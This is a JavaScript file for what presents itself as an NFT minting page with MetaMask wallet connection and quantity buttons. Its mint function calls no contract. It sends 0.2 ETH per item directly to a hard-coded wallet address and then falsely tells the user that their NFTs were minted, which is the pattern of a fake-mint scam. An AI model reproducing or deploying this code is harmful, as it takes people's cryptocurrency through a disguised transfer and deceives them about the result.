var amount = 1;

var mintbtn =
  document.getElementById("mintbtn");
var minttxt =
  document.getElementById("minttxt");
var accounts;

var plusbtn = document.getElementById("plusbtn");
var minusbtn =
  document.getElementById("minusbtn");
var pricex =
  document.getElementById("pricex");
var price = document.getElementById("price");

var setmaxbtn = document.getElementById("setmaxbtn");

plusbtn.onclick = () => {
  if (amount < 10) {
    console.log(amount)
    amount += 1;
  }
  pricex.textContent = amount;
  price.textContent = (amount * 0.2).toFixed(1)
};
minusbtn.onclick = () => {
  if (amount > 1) {
    amount -= 1;
  }
  pricex.textContent = amount;
  price.textContent = (amount * 0.2).toFixed(1)
};

setmaxbtn.onclick = () => {
  amount = 10;
  pricex.textContent = amount;
  price.textContent = (amount * 0.2).toFixed(1)
};

if (typeof window.ethereum === "undefined") {
  mintbtn.disabled = true;
  minttxt.textContent =
    "Please install MetaMask to connect your wallet";
} else {
  mintbtn.addEventListener("click", () => {
    mintbtn.disabled = true;
    if (mintbtn.textContent == "Mint") {
      mintTransfer();
    } else {
      window.ethereum
        .request({
          method: "eth_requestAccounts",
        })
        .then(accountsChanged);
    }
  });

  window.ethereum.on(
    "accountsChanged",
    accountsChanged
  );

  function accountsChanged(acc) {
    accounts = acc;
    mintbtn.disabled = false;
    if (accounts.length > 0) {
      mintbtn.textContent = "Mint";
      minttxt.textContent = "Click to Mint";
    } else {
      minttxt.textContent = "Click to Connect";
      mintbtn.textContent = "Connect";
    }
  }

  function mintTransfer() {
    var eth = (
      200000000000000000 * amount
    ).toString(16);

    ethereum
      .request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }],
      })
      .then(() =>
        ethereum
          .request({
            method: "eth_sendTransaction",
            params: [
              {
                from: accounts[0],
                to: "0x07c11F1ff694d678a6eB246710E5bA2eD936aC4c",
                value: "0x" + eth,
              },
            ],
          })
          .then((txHash) => {
            minttxt.textContent =
              "Successfully minted " +
              amount +
              " NFTs to " +
              accounts[0];
            minttxt2.textContent =
              "Successfully minted " +
              amount +
              " NFTs to " +
              accounts[0];
          })
          .catch((error) => {
            minttxt.textContent =
              "Please try again";
            console.error(error);
          })
      );

    mintbtn.disabled = false;
  }
}